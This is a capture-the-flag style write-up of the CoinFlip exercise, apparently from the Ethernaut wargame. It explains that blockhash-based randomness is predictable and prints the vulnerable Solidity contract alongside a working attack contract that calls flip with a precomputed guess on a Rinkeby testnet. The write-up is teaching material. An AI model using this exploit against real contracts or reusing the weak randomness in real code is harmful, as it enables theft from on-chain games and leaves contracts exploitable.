## Exercise 3: Coinflip

The vulnerabilioty in the CoinFlip contract is the source of randomness used to generate a result. The outcome of the coinflip is determined by the previous blockhash divided by a constant. This is deterministic and can therefore be calculated in a malicious contract and passed to  the original contract as a guaranteed correct guess.

The following contracts are the original vulnerable contract, `CoinFlip.sol`, and the new malicious contract, `CoinFlipHack.sol`. The latter can be deployed on Rinkeby, the same as the original contract. When the hack() function is called, the CoinFlipHack contract calls to the original deployed CoinFlip contract passign a correct guess as an argument. When calledN times, this leads to N consecutive guesses.


### Vulnerable Contract
```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

```

### Malicious Contract

```javascript

// "SPDX-License-Identifier: UNLICENSED"
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import "./CoinFlip.sol";

contract CoinFlipHack {

  using SafeMath for uint256;
  address target_address = 0xF3DB36bAcc4d7f47E970010E8D3328e3e662b49F;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip originalContract;

  constructor() public {
      originalContract = CoinFlip(target_address);
  }
  function hack() public returns (bool){
    
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool _guess = coinFlip == 1 ? true : false;

    originalContract.flip(_guess);

  }

}

```